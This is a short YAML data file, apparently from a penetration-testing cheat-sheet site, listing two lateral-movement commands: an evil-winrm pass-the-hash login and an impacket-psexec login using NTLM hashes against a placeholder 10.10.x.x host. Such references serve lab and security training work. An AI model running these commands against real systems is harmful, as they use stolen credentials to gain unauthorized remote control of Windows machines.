---
title: "Lateral Movement"
id: "lateral"
icon: "material-symbols:directions-run-rounded"
commands:
  - cmd: "evil-winrm -i 10.10.x.x -u user -H hash"
    desc: "Pass-The-Hash WinRM"
    difficulty: "Medium"
    tags: ["winrm", "powershell", "hash"]

  - cmd: "impacket-psexec administrator@10.10.x.x -hashes :hash"
    desc: "Impacket PsExec Hash"
    difficulty: "Hard"
    tags: ["impacket", "windows", "psexec"]
---

